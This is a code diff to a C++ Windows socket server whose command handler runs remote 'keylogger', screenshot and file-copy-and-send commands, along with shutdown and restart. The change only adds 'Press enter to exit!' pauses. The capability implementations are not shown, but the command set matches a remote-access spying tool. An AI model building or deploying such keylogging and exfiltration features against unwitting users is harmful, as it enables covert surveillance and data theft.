@@ -209,12 +209,19 @@ void Server::handleClient(SOCKET clientSocket) {
 
         if (receivedMessage == "shutdown") {
             std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
+
+            std::cout << "Press enter to exit!";
+            std::cin.get();
+
             closesocket(listenSocket);  // Close listening socket to stop accepting new connections
             shutdownServer();
             exit(0);  // Exit the server program
         }
         if(receivedMessage == "restart"){
             std::cout << "Restart command received. Server is restarting..." << std::endl;
+
+            std::cout << "Press enter to exit!";
+            std::cin.get();
             closesocket(listenSocket);  // Close listening socket to stop accepting new connections
             restartServer();
             exit(0);  // Exit the server program
@@ -222,6 +229,9 @@ void Server::handleClient(SOCKET clientSocket) {
         if(receivedMessage == "keylogger"){
             std::cout << "Keylogger command received." << std::endl;
             keyLogger(clientSocket);
+
+            std::cout << "Press enter to exit!";
+            std::cin.get();
             closesocket(listenSocket); 
             exit(0);  // Exit the server program
         }
@@ -235,6 +245,9 @@ void Server::handleClient(SOCKET clientSocket) {
             // Send the screenshot back to the client
             // sendScreenshot(clientSocket, "screenshot.png");
             sendScreenshot(clientSocket, "screenshot.png");
+
+            std::cout << "Press enter to exit!";
+            std::cin.get();
 
             closesocket(listenSocket);  // Close listening socket to stop accepting new connections
             exit(0);  // Exit the server program
@@ -251,6 +264,9 @@ void Server::handleClient(SOCKET clientSocket) {
 
             // Call the method to copy the file and send it back
             copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
+
+            std::cout << "Press enter to exit!";
+            std::cin.get();
 
             closesocket(listenSocket);  // Close listening socket to stop accepting new connections
             exit(0);  // Exit the server program
